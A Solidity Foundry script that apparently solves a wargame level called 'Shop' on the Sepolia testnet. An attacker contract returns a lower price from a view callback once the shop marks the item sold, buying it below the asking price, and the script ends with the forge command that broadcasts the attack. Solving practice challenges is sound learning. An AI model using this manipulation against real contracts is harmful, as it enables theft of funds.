// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level21Shop.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective:
//   Сan you get the item from the shop for less than the price asked?

contract Player is IBuyer {
    Shop public shop =
        Shop(payable(0xA56be56a7a6BA7C7bb018e8989b9bDa324Af9a2a));

    function price() external view override returns (uint256) {
        if (shop.isSold()) {
            return 99;
        }

        return 100;
    }

    function attack() external {
        shop.buy();
    }
}

contract Level21Solution is Script {
    Shop public shop =
        Shop(payable(0x8926B1177655e2319712C182e25A4c7e5946b128));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Player().attack();

        vm.stopBroadcast();
    }
}
// forge script script/Level21Solution.s.sol:Level21Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
